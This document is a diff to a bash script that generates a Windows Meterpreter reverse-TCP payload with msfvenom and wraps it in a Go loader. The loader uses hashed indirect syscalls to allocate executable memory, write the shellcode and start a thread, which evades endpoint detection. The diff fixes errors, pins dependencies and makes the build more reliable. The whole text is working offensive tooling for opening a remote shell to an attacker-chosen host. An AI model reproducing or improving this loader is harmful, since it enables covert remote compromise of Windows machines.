@@ -22,10 +22,10 @@ for arg in "$@"; do
 done
 set -- "${ARGS[@]}"
 
-LHOST="${1:-}"; LPORT="${2:-}"; TEMPLATE="${3:-none}"
+LHOST="${1:-}"; LPORT="${2:-}"
 
 if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
-    echo "Usage: $0 <LHOST> <LPORT> [template]" >&2
+    echo "Usage: $0 <LHOST> <LPORT>" >&2
     exit 1
 fi
 
@@ -53,10 +53,12 @@ err() { echo -e "\e[1;31m[-]\e[0m $*"; }
 info "Generating shellcode for $LHOST:$LPORT..."
 log "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hex EXITFUNC=thread"
 
-# Capture msfvenom output and exit code properly
+# Capture msfvenom output and exit code properly - FIX #1
 MSF_OUT=""
-if ! MSF_OUT=$(msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hex EXITFUNC=thread 2>&1); then
-    MSF_EXIT=$?
+MSF_EXIT=0
+MSF_OUT=$(msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hex EXITFUNC=thread 2>&1)
+MSF_EXIT=$?
+if [ $MSF_EXIT -ne 0 ]; then
     err "msfvenom failed (exit $MSF_EXIT)"
     echo "$MSF_OUT"
     exit 1
@@ -82,28 +84,61 @@ done
 HEX="${HEX%,}"
 
 log "Writing main.go..."
-# Write main.go with the HEX array properly expanded
-cat > main.go << GOEOF
+# Write main.go with the HEX array properly expanded - FIX #10: error checking
+cat > main.go << 'GOEOF'
 package main
-import ("unsafe"; "github.com/f1zm0/acheron"; "golang.org/x/sys/windows")
-var scHex = []byte{$HEX}
+
+import (
+	"unsafe"
+	"github.com/f1zm0/acheron"
+	"golang.org/x/sys/windows"
+)
+
+var scHex = []byte{HEX_PLACEHOLDER}
+
 func main() {
-    var a,b uintptr; h:=uintptr(0xffffffffffffffff)
-    ach,_:=acheron.New(); n:=len(scHex)
-    ach.Syscall(ach.HashString("NtAllocateVirtualMemory"),h,uintptr(unsafe.Pointer(&a)),0,uintptr(unsafe.Pointer(&n)),windows.MEM_COMMIT|windows.MEM_RESERVE,windows.PAGE_EXECUTE_READWRITE)
-    ach.Syscall(ach.HashString("NtWriteVirtualMemory"),h,a,uintptr(unsafe.Pointer(&scHex[0])),uintptr(n),0)
-    ach.Syscall(ach.HashString("NtCreateThreadEx"),uintptr(unsafe.Pointer(&b)),windows.GENERIC_EXECUTE,0,h,a,0,0,0,0,0,0)
-    windows.WaitForSingleObject(windows.Handle(b),0xffffffff)
+	var a, b uintptr
+	h := uintptr(0xffffffffffffffff)
+	
+	ach, err := acheron.New()
+	if err != nil {
+		panic("acheron.New failed: " + err.Error())
+	}
+	n := len(scHex)
+	
+	r1, err1 := ach.Syscall(ach.HashString("NtAllocateVirtualMemory"), h, uintptr(unsafe.Pointer(&a)), 0, uintptr(unsafe.Pointer(&n)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	if r1 != 0 || err1 != nil {
+		panic("NtAllocateVirtualMemory failed")
+	}
+	
+	r2, err2 := ach.Syscall(ach.HashString("NtWriteVirtualMemory"), h, a, uintptr(unsafe.Pointer(&scHex[0])), uintptr(n), 0)
+	if r2 != 0 || err2 != nil {
+		panic("NtWriteVirtualMemory failed")
+	}
+	
+	r3, err3 := ach.Syscall(ach.HashString("NtCreateThreadEx"), uintptr(unsafe.Pointer(&b)), windows.GENERIC_EXECUTE, 0, h, a, 0, 0, 0, 0, 0, 0)
+	if r3 != 0 || err3 != nil {
+		panic("NtCreateThreadEx failed")
+	}
+	
+	windows.WaitForSingleObject(windows.Handle(b), 0xffffffff)
 }
 GOEOF
+
+# Replace placeholder with actual HEX
+sed -i "s/HEX_PLACEHOLDER/${HEX}/" main.go
 
 log "Go mod init..."
 GO_MOD_OUT=$(go mod init tmp 2>&1)
 [ "$VERBOSE" = true ] && echo "$GO_MOD_OUT"
 
 log "Downloading dependencies (timeout 120s)..."
-timeout 120 go get github.com/f1zm0/acheron golang.org/x/sys/windows 2>&1 | tee "$WORKDIR/go_get.log"
+timeout 120 go get github.com/f1zm0/acheron@v1.0.0 golang.org/x/sys/windows@v0.47.0 2>&1 | tee "$WORKDIR/go_get.log"
 [ "$VERBOSE" = true ] && grep -v "go: downloading" "$WORKDIR/go_get.log" || true
+
+# Run go mod tidy to generate go.sum - FIX #11
+log "Running go mod tidy..."
+go mod tidy
 
 info "Building GOOS=windows GOARCH=amd64..."
 log "GOOS=windows GOARCH=amd64 go build -v -ldflags=\"-s -w\" -o $OUTFILE main.go"
